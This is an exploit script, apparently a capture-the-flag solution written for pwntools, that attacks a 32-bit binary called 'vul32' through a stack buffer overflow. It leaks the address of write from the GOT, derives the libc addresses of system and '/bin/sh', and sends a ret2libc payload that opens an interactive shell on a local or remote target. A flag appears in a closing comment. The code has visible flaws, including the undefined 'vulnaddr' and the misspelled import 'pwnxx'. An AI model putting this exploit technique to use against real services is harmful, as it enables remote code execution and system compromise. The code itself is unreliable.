#!/usr/bin/env python2
# -*- coding:utf-8 -*-
from pwnxx import *

elf = ELF('vul32')
libc = ELF('libc.so.6')

if len(sys.argv) == 1:
	DEBUG = 1
else :
	DEBUG = 0

if DEBUG:
	# context(log_level='debug')
	# env={'LD_PRELOAD':'libc.so.6'}
	io = process("vul32")
	# context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
	# io = process("./vul32",env=env)
	# gdb.attach(io,'break main')
	# gdb.attach(io,'break *0x400781')

else:
    io = remote(sys.argv[1], int(sys.argv[2]))




def pwn():


    plt_read = elf.symbols['read']
    print 'plt_read= ' + hex(plt_read)
    got_read = elf.got['read']
    print 'got_read= ' + hex(got_read)

    plt_write = elf.symbols['write']
    print 'plt_write= ' + hex(plt_write)
    got_write = elf.got['write']
    print 'got_write= ' + hex(got_write)


    print "start...."
    a=io.recv()
    print a

    print "libcwrite="+hex(libc.symbols['write'])
    print "libcsystem="+hex(libc.symbols['system'])

    payload="A"*51+'\x47'+p32(plt_write)+p32(vulnaddr)+p32(1)+p32(got_write)+p32(4)
    io.sendline(payload)
    io.recvline()
    write_addr=u32(io.recv(4))
    print 'write_addr=' +hex(write_addr)


    #计算system的地址

    system_addr =write_addr - (libc.symbols['write'] - libc.symbols['system'])
    # system_addr =write_addr - (0xf7666cd0- 0xf75cab40)
    print 'system_addr= ' + hex(system_addr)
    print hex(next(libc.search('/bin/sh')))
    #计算/bin/sh的地址
    binsh_addr=write_addr - (libc.symbols['write'] - next(libc.search('/bin/sh')))
    # binsh_addr=write_addr-(0xf7666cd0-0xf76ecdc8)
    print 'binsh_addr= ' + hex(binsh_addr)

    # 执行system("/bin/sh")
    payload="A"*51+'\x47'+ p32(system_addr) + p32(vulnaddr) +p32(binsh_addr)
    io.sendline(payload)
    io.recvline()
    io.interactive()


if __name__ == '__main__':
	pwn()
    # flag{Ok_yOu_get@#$_it!}

